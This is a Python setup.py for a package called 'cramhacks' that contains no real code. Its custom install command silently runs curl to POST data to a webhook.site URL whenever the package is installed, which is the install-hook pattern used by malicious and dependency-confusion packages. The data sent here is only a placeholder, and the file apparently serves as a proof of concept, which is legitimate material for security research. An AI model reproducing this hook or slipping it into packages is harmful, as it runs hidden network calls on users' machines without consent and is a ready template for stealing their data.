from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstallCommand(install):
    def run(self):
        try:
            subprocess.check_call(['curl', '-X', 'POST', 'https://webhook.site/8dae2bf4-e24f-4373-b31f-09c1fd9c4aad', '-d', 'data=example'])
        except subprocess.CalledProcessError:
            self.warn('curl request failed')
        install.run(self)

setup(
    name='cramhacks',
    version='0.0.10',
    packages=[],
    install_requires=[
        # Add your dependencies here if any
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
